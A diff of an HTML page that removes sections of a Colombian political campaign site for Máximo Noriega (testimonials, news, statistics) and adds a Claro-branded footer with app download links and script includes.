-        <section id="seccion7">
-            <h2 class="section-title">Lo que dicen de él</h2>
-            <div class="grid-2">
-                <div class="card">
-                    <p class="quote">"Máximo es un líder con raíces profundas, una vida dedicada a las comunidades y una voz firme por la transformación del país. No es un político tradicional, es un compañero más en la lucha por la dignidad."</p>
-                    <div class="image-placeholder" style="height: 80px; width: 80px; border-radius: 50%; margin: 1rem auto;">
-                        <span class="placeholder-text">URL_TESTIMONIO_1</span>
-                    </div>
-                    <h4 class="text-center">- Líder Comunitario</h4>
-                </div>
-                <div class="card">
-                    <p class="quote">"Su compromiso con las regiones olvidadas es genuino. He visto cómo trabaja codo a codo con las comunidades, escuchando y construyendo soluciones colectivas."</p>
-                    <div class="image-placeholder" style="height: 80px; width: 80px; border-radius: 50%; margin: 1rem auto;">
-                        <span class="placeholder-text">URL_TESTIMONIO_2</span>
-                    </div>
-                    <h4 class="text-center">- Líder Social</h4>
-                </div>
-            </div>
-        </section>
-
-        <!-- SECCIÓN 8: Blog / Noticias -->
-        <section id="seccion8">
-            <h2 class="section-title">Actualidad</h2>
-            <div class="grid-3">
-                <div class="card">
-
-                    <h3>Respaldo al Cambio</h3>
-                    <p>Máximo Noriega ratifica su respaldo al proyecto del cambio y al presidente Gustavo Petro.</p>
-                </div>
-                <div class="card">
-
-                    <h3>Encuentro Estratégico</h3>
-                    <p>Encuentro en Barranquilla: Máximo Noriega y su equipo definen las rutas para el Senado 2026.</p>
-                </div>
-                <div class="card">
-
-                    <h3>Liderazgo Colectivo</h3>
-                    <p>"Un hombre del pueblo, para el pueblo": La visión de Máximo Noriega sobre el liderazgo colectivo y la participación ciudadana.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- SECCIÓN 9: Estadísticas -->
-        <section id="seccion9">
-            <h2 class="section-title">Trayectoria en Cifras</h2>
-            <div class="grid-3">
-                <div class="card text-center">
-                    <div class="stats-number">+15</div>
-                    <p>Años de trayectoria en el servicio público</p>
-                </div>
-                <div class="card text-center">
-                    <div class="stats-number">+4</div>
-                    <p>Cargos de elección popular y responsabilidades directivas</p>
-                </div>
-                <div class="card text-center">
-                    <div class="stats-number">+100</div>
-                    <p>Comunidades visitadas y escuchadas en el territorio atlanticense</p>
-                </div>
-            </div>
-            <div class="image-placeholder fifinal" style="margin-top: 2rem;">
-                
-            </div>
-        </section>
 
 
 
-    <footer>
-        <p>Máximo Noriega - Cambio al Máximo</p>
-        <p>Todos los derechos reservados | Construyendo una Colombia más justa, democrática y humana</p>
-        <p style="margin-top: 1rem; font-size: 0.9rem;">Síguenos en redes sociales: @maximonoriega</p>
+
+</main><br><br>
+    <footer id="footerr">
+        <p class="app">Descarga ya la App Mi Claro</p>
+        <img class="android" src="img/android.png">
+        <img class="ios" src="img/ios.png">
+        <p>Terminos y condiciones - Politicas de privacidad.</p>
+        <br><br>
+        <div class="footer2">
+            <img class="logo2" src="img/logocl.png" width="80"> 
+            <p>Todos los derechos reservados - 2024 Claro</p>
+        </div>
     </footer>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
 </body>
+<script src="js/colores.js?v1"></script>
+
 </html>
